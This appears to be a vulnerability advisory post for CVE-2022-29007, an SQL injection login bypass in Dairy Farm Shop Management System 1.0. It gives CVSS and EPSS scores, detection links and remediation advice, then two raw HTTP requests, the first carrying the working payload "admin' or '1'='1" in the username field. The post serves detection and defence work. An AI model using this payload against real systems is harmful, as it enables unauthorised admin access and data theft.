---
layout: post
cve_id: CVE-2022-29007
title: Dairy Farm Shop Management System 1.0 - SQL Injection
pcap: true
pcap_path: /pcaps/2022/CVE-2022-29007.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-29007.yaml
snort2_rule: N/A
snort3_rule: N/A
author: TenBird
severity: critical
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary SQL queries, potentially leading to unauthorized access, data
  manipulation, or data leakage.

  '
remediation: 'Upgrade to the latest version to mitigate this vulnerability.

  '
reference:
- https://www.exploit-db.com/exploits/50365
- https://phpgurukul.com/dairy-farm-shop-management-system-using-php-and-mysql/
- https://nvd.nist.gov/vuln/detail/CVE-2022-29007
- https://github.com/sudoninja-noob/CVE-2022-29007/blob/main/CVE-2022-29007.txt
- https://github.com/trhacknon/Pocingit
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-29007
  cwe-id: CWE-89
  epss-score: 0.92276
  epss-percentile: 0.99703
  cpe: cpe:2.3:a:phpgurukul:dairy_farm_shop_management_system:1.0:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: phpgurukul
  product: dairy_farm_shop_management_system
tags:
- cve
- cve2022
- sqli
- auth-bypass
- edb
- phpgurukul
- vkev
- vuln
---

## üîç Vulnerability Description
Dairy Farm Shop Management System 1.0 contains multiple SQL injection vulnerabilities via the username and password parameters in the Admin panel. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.


## üåê HTTP Request
```nohighlight
POST /dfsms/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Connection: close
Content-Length: 48
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip

username=admin' or '1'='1&password=1&login=login
```

```nohighlight
GET /dfsms/add-category.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

